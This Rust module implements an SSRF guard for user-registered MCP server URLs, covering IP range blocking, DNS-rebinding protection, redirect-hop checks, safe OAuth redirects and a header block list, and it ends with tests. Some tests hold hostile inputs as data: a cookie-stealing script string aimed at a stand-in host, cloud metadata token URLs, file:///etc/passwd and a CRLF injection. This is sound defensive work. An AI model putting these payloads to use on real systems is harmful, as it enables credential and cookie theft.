//! SSRF guard for user-supplied MCP server URLs.
//!
//! Users can register generic MCP servers with arbitrary URLs, and the gateway
//! (plus the `/probe` endpoint) makes server-side requests to them. Without a
//! guard, a tenant could point a "server" at `http://localhost`, an internal
//! service, or the cloud metadata endpoint (`169.254.169.254`) and have the
//! platform fetch it on their behalf — a classic SSRF. This rejects any URL that
//! resolves to a loopback / private / link-local / unspecified address.
//!
//! Enforced at **registration** and **probe** time (not the hot path). The
//! DNS-rebinding gap between validation and the later connection is closed by
//! [`GuardedResolver`], installed on the generic-backend client so reqwest
//! connects only to addresses that pass the same check at resolution time.
//!
//! A `GenericMcpProvider` also holds a **second, unguarded** client — this is
//! not a bypass of the guard above. It exists solely for `MCPServerConfig`s
//! whose `trusted` flag is `true`, meaning the connector's `url` was never
//! typed by a user in the first place. Two distinct cases set it: (1) an
//! `uploaded_build` MCP-server connector, whose address was resolved by the
//! platform's own `ContainerRuntime::endpoint()` after building and deploying
//! the user's uploaded source, and (2) a `provider_type = 'system'`
//! connector — a platform-owned backend the control plane serves itself on
//! loopback, never registered through any user-facing path
//! (`connectors::register_connector` hardcodes `provider_type =
//! 'mcp_server'`; `update_connector`/the share endpoints reject any row
//! that isn't `mcp_server`). Both addresses are necessarily internal/private
//! (a container on the platform's own Docker network, or the control plane's
//! own loopback), which is exactly what this guard exists to reject for
//! *user-supplied* URLs — so live traffic to either kind of `trusted`
//! connector must route around the guard, not through it. `trusted` is
//! computed in exactly one place (`credentials::build_server_config`) from
//! the connector's `source_kind`/`provider_type` columns and is never
//! accepted as external input anywhere (not in `NewConnectorInput`, the HTTP
//! `CreateConnector` body, or any CLI argument) — see
//! `provider/generic.rs::GenericMcpProvider`.

use std::net::{IpAddr, Ipv4Addr, SocketAddr};
use std::sync::Arc;

use reqwest::dns::{Addrs, Name, Resolve, Resolving};

use crate::error::{McpError, Result};

/// True when the `MCP_ALLOW_PRIVATE_URLS` dev/test bypass is set. Read per-call
/// (not cached) so both the registration-time check and the connect-time
/// resolver observe the same value regardless of construction order.
fn private_urls_allowed() -> bool {
    std::env::var("MCP_ALLOW_PRIVATE_URLS").is_ok_and(|v| v == "true" || v == "1")
}

/// A reqwest DNS resolver that rejects any hostname resolving (even partially) to
/// a private/internal address.
///
/// [`validate_public_url`] guards at **registration/probe** time, but the actual
/// backend fetch happens later against the stored hostname — a hostile DNS could
/// return a public IP at registration and a private one (e.g. `169.254.169.254`)
/// at fetch time (DNS rebinding). Installing this resolver on the client used for
/// generic-backend egress closes that gap: reqwest connects to **exactly** the
/// addresses returned here, so the check and the connection share one resolution
/// — no TOCTOU window. It is scoped to the generic-MCP client only; the platform's
/// shared client must still reach internal hosts (agent containers, OTel, …).
#[derive(Debug, Default)]
struct GuardedResolver;

impl Resolve for GuardedResolver {
    fn resolve(&self, name: Name) -> Resolving {
        Box::pin(async move {
            let host = name.as_str().to_owned();
            let addrs = tokio::net::lookup_host((host.as_str(), 0)).await?;
            let allow_private = private_urls_allowed();
            let filtered: Vec<SocketAddr> = addrs
                .filter(|sa| allow_private || !is_blocked_ip(sa.ip()))
                .collect();
            if filtered.is_empty() {
                return Err(format!(
                    "host '{host}' did not resolve to any allowed (public) address"
                )
                .into());
            }
            let iter: Addrs = Box::new(filtered.into_iter());
            Ok(iter)
        })
    }
}

/// Build a reqwest client whose DNS resolution rejects private/internal targets
/// (SSRF + DNS-rebinding hardened), for outbound calls to user-registered MCP
/// backends. Reuses the platform's rustls stack; per-request timeouts are set by
/// the caller. Honors the `MCP_ALLOW_PRIVATE_URLS` dev/test bypass.
pub fn guarded_http_client() -> reqwest::Client {
    guarded_client_builder()
        .redirect(guarded_redirect_policy())
        .build()
        .expect("failed to build SSRF-guarded reqwest client")
}

/// The builder behind [`guarded_http_client`], for callers that set their own timeouts,
/// pooling and redirect policy. A redirect to an IP literal skips the resolver, so a
/// caller that follows redirects to user-chosen hosts must turn them off.
pub fn guarded_client_builder() -> reqwest::ClientBuilder {
    reqwest::Client::builder().dns_resolver(Arc::new(GuardedResolver))
}

/// [`guarded_http_client`] that never reuses a connection, for MCP servers a
/// user registered. A backend that answers before reading the whole request
/// body (Azure API Management rejecting a session-less call) can leave those
/// bytes on a kept-alive socket, and the next request on it (our `initialize`)
/// then fails with a content-length mismatch.
pub fn guarded_http_client_no_reuse() -> reqwest::Client {
    reqwest::Client::builder()
        .dns_resolver(Arc::new(GuardedResolver))
        .redirect(guarded_redirect_policy())
        .pool_max_idle_per_host(0)
        .build()
        .expect("failed to build SSRF-guarded reqwest client")
}

/// Client for uploaded-build MCP servers (`trusted` connectors). The platform
/// deployed them and resolved their address, which may be internal, so the
/// resolver is not guarded. Their code is a member's, though, so a redirect is
/// followed only within the same origin (`/mcp` to `/mcp/`): a `302` to any
/// other host, `http://10.0.0.5/` or the metadata server, is refused (NAS-1770).
pub fn trusted_http_client() -> reqwest::Client {
    reqwest::Client::builder()
        .redirect(same_origin_redirect_policy())
        .build()
        .expect("failed to build the trusted MCP backend client")
}

/// The most redirects a guarded request follows (reqwest's default is 10).
const MAX_GUARDED_REDIRECTS: usize = 5;

/// Follow a redirect only to the origin (scheme, host and port) of the hop before it.
fn same_origin_redirect_policy() -> reqwest::redirect::Policy {
    reqwest::redirect::Policy::custom(|attempt| {
        if attempt.previous().len() >= MAX_GUARDED_REDIRECTS {
            return attempt.error("too many redirects");
        }
        let same_origin = attempt
            .previous()
            .last()
            .is_some_and(|previous| previous.origin() == attempt.url().origin());
        if same_origin {
            attempt.follow()
        } else {
            attempt.error("refused a redirect to another origin")
        }
    })
}

/// Every redirect hop of a guarded request is checked before it is followed.
///
/// [`GuardedResolver`] only sees hostnames. A hop to an IP literal
/// (`http://169.254.169.254/...`, the cloud metadata server) needs no DNS, so
/// before this a public URL that answered `302 Location: http://169.254.169.254/`
/// took the request straight to the metadata server, with the connector's own
/// headers, and the gateway returned the body to the member.
///
/// A hop is followed only if it is `http(s)`, not `localhost`, not an IP
/// literal in a blocked range, and not a downgrade from `https` to `http`.
/// A hop to a hostname is then checked by [`GuardedResolver`] when it connects.
fn guarded_redirect_policy() -> reqwest::redirect::Policy {
    reqwest::redirect::Policy::custom(|attempt| {
        if attempt.previous().len() >= MAX_GUARDED_REDIRECTS {
            return attempt.error("too many redirects");
        }
        let from_https = attempt
            .previous()
            .last()
            .is_some_and(|previous| previous.scheme() == "https");
        if from_https && attempt.url().scheme() == "http" {
            return attempt.error("refused a redirect from https to http");
        }
        match redirect_hop_refusal(attempt.url()) {
            Some(why) => attempt.error(why),
            None => attempt.follow(),
        }
    })
}

/// Why a guarded request may not follow a redirect to `url`, if it may not.
fn redirect_hop_refusal(url: &reqwest::Url) -> Option<String> {
    target_refusal(url).map(|why| format!("refused a redirect to {why}"))
}

/// Why the gateway may not send a request to `url`, if it may not: what
/// [`GuardedResolver`] can't see. A hostname is resolved, and checked, when the
/// request connects; an IP literal or `localhost` never is.
fn target_refusal(url: &reqwest::Url) -> Option<String> {
    if !matches!(url.scheme(), "http" | "https") {
        return Some(format!("a '{}' URL", url.scheme()));
    }
    if private_urls_allowed() {
        return None;
    }
    let Some(host) = url.host_str() else {
        return Some("a URL with no host".to_string());
    };
    let lower = host.to_ascii_lowercase();
    if lower == "localhost" || lower.ends_with(".localhost") {
        return Some("a loopback address".to_string());
    }
    // `host_str` keeps an IPv6 literal's brackets.
    let literal = lower.trim_start_matches('[').trim_end_matches(']');
    match literal.parse::<IpAddr>() {
        Ok(ip) if is_blocked_ip(ip) => Some("a private or internal address".to_string()),
        _ => None,
    }
}

/// Refuse a URL that another server handed the gateway (an OAuth server's
/// metadata names its token and registration endpoints, a `401` names its
/// resource metadata) when it points at a private or internal IP literal or
/// `localhost`. Those requests go through the guarded client, whose resolver
/// checks hostnames but never sees an IP literal (NAS-1770).
///
/// The crate's own tests run OAuth servers on `127.0.0.1` with a plain client,
/// so this check is off in them; [`target_refusal`] has its own tests.
pub fn check_remote_endpoint(raw: &str) -> std::result::Result<(), String> {
    if cfg!(test) {
        return Ok(());
    }
    let url = reqwest::Url::parse(raw).map_err(|e| format!("invalid url: {e}"))?;
    match target_refusal(&url) {
        Some(why) => Err(format!("refused a request to {why}")),
        None => Ok(()),
    }
}

/// Headers a connector may not set. They select or impersonate infrastructure
/// rather than authenticate to an MCP server: the cloud metadata servers want
/// one of the first five, and the rest are hop-by-hop or would let a member
/// speak for the gateway or a proxy in front of it.
const BLOCKED_CONNECTOR_HEADERS: [&str; 16] = [
    "metadata-flavor",
    "x-google-metadata-request",
    "metadata",
    "x-aws-ec2-metadata-token",
    "x-aws-ec2-metadata-token-ttl-seconds",
    "host",
    "forwarded",
    "x-real-ip",
    "connection",
    "keep-alive",
    "proxy-connection",
    "te",
    "trailer",
    "transfer-encoding",
    "upgrade",
    "content-length",
];
/// Prefixes of the same kind (`X-Forwarded-For`, `Proxy-Authorization`, ...).
const BLOCKED_CONNECTOR_HEADER_PREFIXES: [&str; 2] = ["x-forwarded-", "proxy-"];

/// Whether a connector may send a header with this name to its MCP server.
pub fn connector_header_allowed(name: &str) -> bool {
    let lower = name.trim().to_ascii_lowercase();
    !BLOCKED_CONNECTOR_HEADERS.contains(&lower.as_str())
        && !BLOCKED_CONNECTOR_HEADER_PREFIXES
            .iter()
            .any(|prefix| lower.starts_with(prefix))
}

/// Refuse a connector whose headers (or credential header name) include one
/// that [`connector_header_allowed`] rejects. Checked when a connector is
/// created or changed; the gateway also drops such headers when it sends.
pub fn validate_connector_headers<'a>(names: impl IntoIterator<Item = &'a str>) -> Result<()> {
    for name in names {
        if !connector_header_allowed(name) {
            return Err(McpError::BadRequest(format!(
                "header '{name}' can't be set on a connector"
            )));
        }
    }
    Ok(())
}

/// Restrict an OAuth post-completion redirect to a relative path or a same-origin
/// absolute URL; anything else (other origins, protocol-relative `//host`) falls
/// back to `/`. Prevents the callbacks becoming an open-redirect phishing gadget.
///
/// A target holding any character outside [`is_plain_url_char`] also falls back
/// to `/`: a quote, backslash or angle bracket has no business in a redirect we
/// minted ourselves, and the OAuth callback writes the result into a script.
/// Rejecting `\` also closes `/\host`, which browsers read as `//host`.
pub fn safe_redirect(dest: &str, gateway_public_url: Option<&str>) -> String {
    if !dest.chars().all(is_plain_url_char) {
        return "/".to_string();
    }
    if dest.starts_with('/') && !dest.starts_with("//") {
        return dest.to_string();
    }
    if let Ok(target) = reqwest::Url::parse(dest)
        && let Some(base) = gateway_public_url
        && let Ok(base) = reqwest::Url::parse(base)
        && target.origin() == base.origin()
    {
        return dest.to_string();
    }
    "/".to_string()
}

/// The characters a redirect target may hold: ASCII letters and digits, and the
/// URL punctuation a path, query or fragment needs (`%` for anything else,
/// percent-encoded).
fn is_plain_url_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || "-._~/?#&=%:@+,;!$*[]".contains(c)
}

/// Validate that `raw` is an `http(s)` URL whose host does not resolve to a
/// private/internal address. Returns `BadRequest` otherwise.
pub async fn validate_public_url(raw: &str) -> Result<()> {
    // Opt-in bypass for local dev / tests (loopback backends). MUST stay unset in
    // production — leaving it off is what makes the guard effective.
    if private_urls_allowed() {
        return Ok(());
    }
    check_public_url(raw).await.map_err(McpError::BadRequest)
}

/// The check behind [`validate_public_url`], with no bypass: `raw` must be an
/// `http(s)` URL, and every address its host resolves to must be public.
/// `Err` carries a message fit for a 400 body.
///
/// Also used for agents registered by URL (`nasiko_server::catalog`), which
/// the agent proxy reaches the same way the gateway reaches an MCP server.
/// Each caller owns its own opt-in for private URLs.
pub async fn check_public_url(raw: &str) -> std::result::Result<(), String> {
    let url = reqwest::Url::parse(raw).map_err(|e| format!("invalid url: {e}"))?;

    match url.scheme() {
        "http" | "https" => {}
        s => return Err(format!("unsupported url scheme '{s}' (use http/https)")),
    }

    let host = url.host_str().ok_or("url has no host")?;
    let lower = host.to_ascii_lowercase();
    if lower == "localhost" || lower.ends_with(".localhost") {
        return Err("url host is not allowed (loopback)".to_string());
    }

    let port = url.port_or_known_default().unwrap_or(443);
    let mut resolved = false;
    let addrs = tokio::net::lookup_host((host, port))
        .await
        .map_err(|e| format!("cannot resolve url host: {e}"))?;
    for sa in addrs {
        resolved = true;
        if is_blocked_ip(sa.ip()) {
            return Err("url resolves to a disallowed (private/internal) address".to_string());
        }
    }
    if !resolved {
        return Err("url host did not resolve".to_string());
    }
    Ok(())
}

/// True if `ip` is loopback / private / link-local / unspecified / otherwise
/// non-public (including the IPv4-mapped forms of those).
fn is_blocked_ip(ip: IpAddr) -> bool {
    match ip {
        IpAddr::V4(v) => {
            let o = v.octets();
            v.is_loopback()
                || v.is_private()
                || v.is_link_local() // 169.254/16 — includes the cloud metadata IP
                || v.is_unspecified()
                || v.is_broadcast()
                || v.is_documentation()
                || v.is_multicast()
                || o[0] == 0 // 0/8 "this network"; Linux connects 0.x to the local host
                || (o[0] == 100 && (o[1] & 0xc0) == 0x40) // 100.64/10 carrier-grade NAT
                || (o[0] == 192 && o[1] == 0 && o[2] == 0) // 192.0.0/24 IETF protocol assignments
                || (o[0] == 198 && (o[1] & 0xfe) == 18) // 198.18/15 benchmarking
                || o[0] >= 240 // 240/4 reserved
        }
        IpAddr::V6(v) => {
            if v.is_loopback() || v.is_unspecified() || v.is_multicast() {
                return true;
            }
            if let Some(v4) = v.to_ipv4_mapped() {
                return is_blocked_ip(IpAddr::V4(v4));
            }
            let s = v.segments();
            // 64:ff9b::/96 NAT64: a NAT64 gateway connects to the IPv4 address in the low 32 bits.
            if s[..6] == [0x64, 0xff9b, 0, 0, 0, 0] {
                let [.., a, b, c, d] = v.octets();
                return is_blocked_ip(IpAddr::V4(Ipv4Addr::new(a, b, c, d)));
            }
            (s[0] & 0xfe00) == 0xfc00 // fc00::/7 unique-local
                || (s[0] & 0xffc0) == 0xfe80 // fe80::/10 link-local
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::net::Ipv6Addr;

    #[test]
    fn blocks_private_and_metadata_ips() {
        for ip in [
            "127.0.0.1",
            "10.0.0.5",
            "192.168.1.1",
            "172.16.0.1",
            "169.254.169.254",
            "0.0.0.0",
            "0.1.2.3",
            "100.64.0.1",
            "192.0.0.170",
            "198.18.0.1",
            "224.0.0.1",
            "240.0.0.1",
        ] {
            assert!(
                is_blocked_ip(ip.parse::<Ipv4Addr>().unwrap().into()),
                "{ip} should be blocked"
            );
        }
        assert!(is_blocked_ip(Ipv6Addr::LOCALHOST.into()));
        assert!(is_blocked_ip("fe80::1".parse::<Ipv6Addr>().unwrap().into()));
        assert!(is_blocked_ip("fc00::1".parse::<Ipv6Addr>().unwrap().into()));
        assert!(is_blocked_ip(
            "::ffff:127.0.0.1".parse::<Ipv6Addr>().unwrap().into()
        ));
        assert!(is_blocked_ip(
            "64:ff9b::a9fe:a9fe".parse::<Ipv6Addr>().unwrap().into()
        ));
        assert!(!is_blocked_ip(
            "64:ff9b::5db8:d822".parse::<Ipv6Addr>().unwrap().into()
        ));
        assert!(!is_blocked_ip(
            "93.184.216.34".parse::<Ipv4Addr>().unwrap().into()
        ));
    }

    #[test]
    fn allows_public_ips() {
        for ip in ["8.8.8.8", "1.1.1.1", "93.184.216.34"] {
            assert!(
                !is_blocked_ip(ip.parse::<Ipv4Addr>().unwrap().into()),
                "{ip} should be allowed"
            );
        }
        assert!(!is_blocked_ip(
            "2606:4700:4700::1111".parse::<Ipv6Addr>().unwrap().into()
        ));
    }

    #[test]
    fn safe_redirect_allows_relative_and_same_origin_only() {
        let base = Some("https://app.nasiko.com");
        // Relative paths are always allowed.
        assert_eq!(safe_redirect("/chat", base), "/chat");
        assert_eq!(safe_redirect("/", base), "/");
        // Same-origin absolute is allowed.
        assert_eq!(
            safe_redirect("https://app.nasiko.com/done", base),
            "https://app.nasiko.com/done"
        );
        // Off-origin, protocol-relative, and scheme tricks fall back to "/".
        assert_eq!(safe_redirect("https://evil.example.com", base), "/");
        assert_eq!(safe_redirect("//evil.example.com", base), "/");
        assert_eq!(
            safe_redirect("http://app.nasiko.com/done", base),
            "/",
            "scheme mismatch is off-origin"
        );
        assert_eq!(safe_redirect("javascript:alert(1)", base), "/");
        // With no configured base, only relative paths are allowed.
        assert_eq!(safe_redirect("https://app.nasiko.com/x", None), "/");
        assert_eq!(safe_redirect("/x", None), "/x");
    }

    #[test]
    fn safe_redirect_rejects_characters_that_escape_a_script_or_url() {
        let base = Some("https://app.nasiko.com");
        // Ordinary paths with a query and fragment still pass.
        assert_eq!(
            safe_redirect("/mcp?tab=connectors&id=a1-b2#done", base),
            "/mcp?tab=connectors&id=a1-b2#done"
        );
        // A quote would end the JS string the callback page writes it into.
        assert_eq!(
            safe_redirect("/\"+fetch('//evil.example/'+document.cookie)+\"", base),
            "/"
        );
        assert_eq!(safe_redirect("https://app.nasiko.com/\"+x+\"", base), "/");
        // A closing tag would end the script element.
        assert_eq!(safe_redirect("/</script><script>alert(1)", base), "/");
        // Browsers read `/\host` as `//host`.
        assert_eq!(safe_redirect("/\\evil.example.com", base), "/");
        // Whitespace and control characters.
        assert_eq!(safe_redirect("/path\r\nSet-Cookie: x=y", base), "/");
        assert_eq!(safe_redirect("/a b", base), "/");
    }

    #[test]
    fn rfc1918_172_range_boundaries_are_exact() {
        // 172.16.0.0/12 — just outside on both sides allowed, just inside blocked.
        assert!(!is_blocked_ip(
            "172.15.255.255".parse::<Ipv4Addr>().unwrap().into()
        ));
        assert!(is_blocked_ip(
            "172.16.0.0".parse::<Ipv4Addr>().unwrap().into()
        ));
        assert!(is_blocked_ip(
            "172.31.255.255".parse::<Ipv4Addr>().unwrap().into()
        ));
        assert!(!is_blocked_ip(
            "172.32.0.0".parse::<Ipv4Addr>().unwrap().into()
        ));
    }

    #[test]
    fn link_local_v4_metadata_range_boundaries() {
        // 169.254.0.0/16 — the whole range (incl. cloud metadata IP) blocked end to end.
        assert!(is_blocked_ip(
            "169.254.0.0".parse::<Ipv4Addr>().unwrap().into()
        ));
        assert!(is_blocked_ip(
            "169.254.169.254".parse::<Ipv4Addr>().unwrap().into()
        ));
        assert!(is_blocked_ip(
            "169.254.255.255".parse::<Ipv4Addr>().unwrap().into()
        ));
        assert!(!is_blocked_ip(
            "169.253.255.255".parse::<Ipv4Addr>().unwrap().into()
        ));
        assert!(!is_blocked_ip(
            "169.255.0.0".parse::<Ipv4Addr>().unwrap().into()
        ));
    }

    #[test]
    fn unique_local_v6_range_boundaries() {
        // fc00::/7 spans fc00:: through fdff:...; both ends blocked, fe00:: allowed.
        assert!(is_blocked_ip("fc00::".parse::<Ipv6Addr>().unwrap().into()));
        assert!(is_blocked_ip(
            "fdff:ffff:ffff:ffff:ffff:ffff:ffff:ffff"
                .parse::<Ipv6Addr>()
                .unwrap()
                .into()
        ));
        assert!(!is_blocked_ip(
            "fe00::1".parse::<Ipv6Addr>().unwrap().into()
        ));
        assert!(is_blocked_ip("fe80::1".parse::<Ipv6Addr>().unwrap().into()));
        assert!(!is_blocked_ip(
            "fec0::1".parse::<Ipv6Addr>().unwrap().into()
        )); // fe80::/10 ends before fec0::
    }

    #[test]
    fn ipv4_mapped_ipv6_cannot_bypass_the_guard() {
        // Classic SSRF bypass: private v4 encoded as `::ffff:a.b.c.d`. The guard
        // unwraps `to_ipv4_mapped()` and re-checks, so every private class is caught.
        for ip in [
            "::ffff:127.0.0.1",
            "::ffff:10.0.0.1",
            "::ffff:192.168.1.1",
            "::ffff:172.16.0.1",
            "::ffff:169.254.169.254",
        ] {
            assert!(
                is_blocked_ip(ip.parse::<Ipv6Addr>().unwrap().into()),
                "{ip} (v4-mapped) should be blocked"
            );
        }
        // A v4-mapped *public* address must still be allowed.
        assert!(!is_blocked_ip(
            "::ffff:8.8.8.8".parse::<Ipv6Addr>().unwrap().into()
        ));
    }

    #[test]
    fn multicast_v6_is_blocked() {
        assert!(is_blocked_ip("ff02::1".parse::<Ipv6Addr>().unwrap().into()));
    }

    #[test]
    fn a_redirect_to_an_internal_ip_literal_is_refused() {
        let refused = |u: &str| redirect_hop_refusal(&reqwest::Url::parse(u).unwrap());
        for u in [
            // The metadata server, by IP literal: no DNS, so GuardedResolver never sees it.
            "http://169.254.169.254/computeMetadata/v1/project/?recursive=true",
            "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
            "http://10.0.0.1/",
            "http://127.0.0.1:8080/",
            "http://[::1]/",
            "http://[::ffff:169.254.169.254]/",
            "http://[fd00::1]/",
            "http://localhost/",
            "http://metadata.localhost/",
            "file:///etc/passwd",
            "gopher://example.com/",
        ] {
            assert!(refused(u).is_some(), "{u} must be refused");
        }
        for u in [
            "https://example.com/mcp/",
            "http://example.com/mcp",
            "https://93.184.216.34/mcp",
            "https://[2606:4700:4700::1111]/",
        ] {
            assert!(refused(u).is_none(), "{u} must be followed");
        }
    }

    #[tokio::test]
    async fn a_guarded_request_does_not_follow_a_redirect_to_the_metadata_server() {
        use tokio::io::{AsyncReadExt, AsyncWriteExt};
        // The reporter's redirector: any request gets a 302 to the metadata server. The client
        // here keeps the guarded redirect policy but resolves normally, so it can reach this
        // loopback stand-in for a public redirector.
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        tokio::spawn(async move {
            while let Ok((mut sock, _)) = listener.accept().await {
                tokio::spawn(async move {
                    let mut buf = [0u8; 4096];
                    let _ = sock.read(&mut buf).await;
                    let reply = "HTTP/1.1 302 Found\r\nLocation: http://169.254.169.254/computeMetadata/v1/project/?recursive=true\r\nContent-Length: 0\r\n\r\n";
                    let _ = sock.write_all(reply.as_bytes()).await;
                });
            }
        });
        let client = reqwest::Client::builder()
            .redirect(guarded_redirect_policy())
            .build()
            .unwrap();
        let err = client
            .get(format!("http://{addr}/r"))
            .header("Metadata-Flavor", "Google")
            .send()
            .await
            .expect_err("the redirect must not be followed");
        assert!(err.is_redirect(), "{err}");
        let source = std::error::Error::source(&err).map(ToString::to_string);
        assert!(
            source
                .as_deref()
                .is_some_and(|s| s.contains("private or internal")),
            "{err}: {source:?}"
        );
    }

    #[tokio::test]
    async fn the_trusted_client_follows_a_redirect_only_within_its_origin() {
        use tokio::io::{AsyncReadExt, AsyncWriteExt};
        // An uploaded MCP server runs a member's code: it may send `/mcp` to `/mcp/`, but
        // not the gateway to another host.
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        tokio::spawn(async move {
            while let Ok((mut sock, _)) = listener.accept().await {
                tokio::spawn(async move {
                    let mut buf = [0u8; 4096];
                    let n = sock.read(&mut buf).await.unwrap_or(0);
                    let request = String::from_utf8_lossy(&buf[..n]);
                    let reply = if request.starts_with("GET /mcp/ ") {
                        "HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nok".to_string()
                    } else if request.starts_with("GET /mcp ") {
                        "HTTP/1.1 307 Temporary Redirect\r\nLocation: /mcp/\r\nContent-Length: 0\r\n\r\n".to_string()
                    } else {
                        format!(
                            "HTTP/1.1 302 Found\r\nLocation: http://localhost:{}/mcp/\r\nContent-Length: 0\r\n\r\n",
                            addr.port()
                        )
                    };
                    let _ = sock.write_all(reply.as_bytes()).await;
                });
            }
        });
        let client = trusted_http_client();

        let followed = client
            .get(format!("http://{addr}/mcp"))
            .send()
            .await
            .unwrap();
        assert_eq!(followed.text().await.unwrap(), "ok");

        // Same port, other host: `127.0.0.1` to `localhost` is another origin.
        let err = client
            .get(format!("http://{addr}/elsewhere"))
            .send()
            .await
            .expect_err("a redirect to another origin must not be followed");
        assert!(err.is_redirect(), "{err}");
    }

    #[test]
    fn connector_headers_that_reach_infrastructure_are_refused() {
        for name in [
            "Metadata-Flavor",
            "metadata-flavor",
            " Metadata-Flavor ",
            "X-Google-Metadata-Request",
            "Metadata",
            "X-aws-ec2-metadata-token",
            "Host",
            "X-Forwarded-For",
            "X-Forwarded-Host",
            "Forwarded",
            "Proxy-Authorization",
            "Transfer-Encoding",
        ] {
            assert!(!connector_header_allowed(name), "{name}");
        }
        for name in [
            "Authorization",
            "X-Api-Key",
            "Notion-Version",
            "Accept-Language",
        ] {
            assert!(connector_header_allowed(name), "{name}");
        }
        assert!(validate_connector_headers(["X-Api-Key", "Authorization"]).is_ok());
        assert!(matches!(
            validate_connector_headers(["X-Api-Key", "Metadata-Flavor"]),
            Err(McpError::BadRequest(_))
        ));
    }

    #[tokio::test]
    async fn no_reuse_client_opens_a_new_connection_per_request() {
        use std::sync::atomic::{AtomicUsize, Ordering};
        use tokio::io::{AsyncReadExt, AsyncWriteExt};

        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        let accepted = Arc::new(AtomicUsize::new(0));
        let counter = accepted.clone();
        // Answers every request on a kept-alive connection, as APIM does.
        tokio::spawn(async move {
            loop {
                let (mut sock, _) = listener.accept().await.unwrap();
                counter.fetch_add(1, Ordering::SeqCst);
                tokio::spawn(async move {
                    let mut buf = [0u8; 4096];
                    while sock.read(&mut buf).await.is_ok_and(|n| n > 0) {
                        let reply = "HTTP/1.1 400 Bad Request\r\nContent-Length: 7\r\n\r\nsession";
                        if sock.write_all(reply.as_bytes()).await.is_err() {
                            break;
                        }
                    }
                });
            }
        });

        let client = guarded_http_client_no_reuse();
        for _ in 0..2 {
            let resp = client
                .post(format!("http://{addr}/mcp"))
                .json(&serde_json::json!({"jsonrpc": "2.0", "id": 1, "method": "tools/list"}))
                .send()
                .await
                .unwrap();
            assert_eq!(resp.text().await.unwrap(), "session");
        }
        assert_eq!(accepted.load(Ordering::SeqCst), 2);
    }
}
